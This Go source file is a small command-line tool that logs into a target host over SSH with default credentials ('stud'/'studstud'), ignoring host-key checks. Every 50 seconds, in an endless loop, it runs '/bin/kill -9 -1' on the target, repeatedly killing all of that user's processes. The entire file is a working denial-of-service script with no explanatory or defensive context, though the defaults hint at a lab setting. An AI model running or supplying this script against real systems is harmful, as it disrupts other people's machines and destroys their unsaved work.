package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/SourceCode2/myssh"
	"golang.org/x/crypto/ssh"
)

func main() {
	user := flag.String("user", "stud", "target user")
	ip := flag.String("ip", "", "target ip")
	port := flag.Int("port", 22, "target port")
	pass := flag.String("pass", "studstud", "target passwd")
	flag.Parse()

	if *ip == "" {
		log.Fatalln("Invalid arguments, see -h")
	}

	sshConfig := &ssh.ClientConfig{
		User:            *user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth: []ssh.AuthMethod{
			ssh.Password(*pass),
		},
	}
	client := &myssh.SSHClient{
		Config: sshConfig,
		Host:   *ip,
		Port:   *port,
	}
	cmd := &myssh.SSHCommand{
		Path:   "/bin/kill -9 -1",
		Env:    []string{""},
		Stdin:  os.Stdin,
		Stdout: os.Stdout,
		Stderr: os.Stderr,
	}

	for {
		if err := client.RunCommand(cmd); err != nil {
			fmt.Fprintf(os.Stderr, "command run error: %s\n", err)
			os.Exit(1)
		}
		time.Sleep(50 * time.Second)
	}
}
